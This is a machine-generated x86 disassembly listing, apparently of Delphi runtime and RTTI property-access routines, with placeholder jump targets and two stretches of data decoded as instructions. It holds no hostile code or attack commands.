mov eax ebx
call sub_40ecec
sub_41013c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_4047d4
pop esi
pop ebx
retn
mov eax ebx
call sub_40ecec
sub_4102f8
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41041e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403f4c
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403f4c
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_410754
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403f4c
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404204
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_407fa8
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404204
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403074
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_40287c
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40415c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410425
lea eax [ ebp - 0x208 ]
call sub_403ef8
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404204
sub_4104b0
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_410511
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404cf0
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410518
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403124
sub_410528
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_410754
test al al
je r-xdata
mov eax ebx
call sub_4106d4
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_410560
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4106d4
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_410754
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4105b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4105ec
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_4106d4
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_410628
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034b0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41068b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410692
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_41072c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031d8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_410754
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4107fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404cf0
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_41080c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4108e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4108c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404cf8
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4108cc
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403074
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_40415c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407c60
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4108fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41096b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410972
retn
call sub_4104b0
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_404eb8
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404980
mov eax rw-data
call sub_403ef8
mov eax rw-data
call sub_40ed7c
sub_410974
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410a15
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410a1c
retn
mov eax rw-data
call sub_410480
mov eax sub_40ea7c
mov [ rw-data ] eax
mov eax sub_40e6a4
mov [ rw-data ] eax
mov edx sub_40e5b4
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40ed7c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_410174
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f090
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f3bc
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40fae4
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_410a20
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebp + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] dl
inc edi
add [ ebp + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] bl
inc edi
add [ ebp + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] al
inc edi
add [ ebp + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x74ab0000 ] cl
in al dx
xor eax eax
push ebp
push sub_410b45
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410b4c
retn
sub_410b90
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_410bdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_410b84
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_407fd0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_410b90
mov edx [ rw-data ]
mov eax esi
call sub_407c60
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407c60
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_407fd0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_410c40
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_410cb0
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_410d04
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_410d78
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_410dd4
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410e28
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404194
mov ecx esp
mov edx esi
mov eax ebx
call sub_410dd4
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_410e70
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410e5c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410eb0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410ef8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404724
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_410f34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410eff
lea eax [ ebp - 0x4 ]
call sub_4045d8
retn
sub_410f08
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_410e28
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_410e70
pop ebx
retn
dec bl
je r-xdata
call sub_410eb0
jmp r-xdata
pop ebx
retn
sub_410f34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410ffa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404180
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_410f08
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411001
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404614
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_411008
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_410b84
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_411050 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41117f ]
jmp [ eax * 4 + jump_table_4110ec ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_411214
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_411200
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_411254
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_41128c
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_4112c8
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4055b0
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_41133c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_411382
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411389
retn
mov eax rw-data
call sub_403ef8
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404980
sub_411394
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4113b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4113c0
retn
sub_411432
adc eax [ ecx ]
pop es
inc ebx
insb
popad
jae r-xdata
mov eax eax
mov ah 0x14
inc ecx
add [ ebx ] al
add ch [ esi ]
jae r-xdata
add [ ebx ] al
or [ eax + ecx * 2 + 0x65 ] edx
insb
jo r-xdata
push ebx
push 0x5746669
jae r-xdata
retn
inc eax
add [ esp + edx + 0x41 ] al
add [ ebx ] al
or [ edx + eax * 2 + 0x69 ] edx
inc esp
imul ecx [ ebp + 0x6f ] 0x16564
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x14 ] al
inc ecx
add [ 0x654c6462 ] cl
je r-xdata
outsb
je r-xdata
jns r-xdata
push esp
inc ecx
insb
je r-xdata
add [ eax ] al
add [ eax + 0x7004114 ] dh
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ esi ] al
outsd
push edx
imul esp [ edi + 0x68 ] 0x64620d74
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ gs : eax ] eax
push es
jae r-xdata
jae r-xdata
sbb [ edx + 0x64 ] ah
push edx
bound esp [ edx + edx * 2 + 0x69 ]
push 0x4c6f5474
je r-xdata
add [ ecx + edx ] cl
inc eax
add [ ebp + 0x16000040 ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0xc ] si
adc [ eax ] eax
lea eax [ eax ]
add [ esi ] dl
jb r-xdata
jns r-xdata
je r-xdata
cmp [ 0x68090041 ] dl
dec esp
je r-xdata
add [ eax ] al
inc ebx
insb
or [ gs : ebx + 0x73 ] dh
popad
imul ebp [ fs : esi + 0x67 ] 0x796c6e4f
pop es
jae r-xdata
imul esp [ edi + 0x68 ] 0x4c6f5474
outsd
inc ecx
insb
imul esp [ edi + 0x6e ] 0x52646218
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] dl
outsd
jb r-xdata
inc esp
outsd
jne r-xdata
or [ ebx + 0x73 ] dh
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
adc eax 0x68090041
insb
insb
pop es
inc ebx
insb
popad
jae r-xdata
add [ ecx ] al
or al 0x54
jae r-xdata
dec eax
insb
jo r-xdata
mov eax eax
and [ 0xc010041 ] dl
push esp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + 0x74 ] ebp
inc ebx
outsd
outsb
dec ebx
dec ebp
imul esp [ esp + 0x6c ] 0x73730865
push edx
imul esp [ edi + 0x68 ] 0x73730874
add [ ecx ] ecx
jae r-xdata
popad
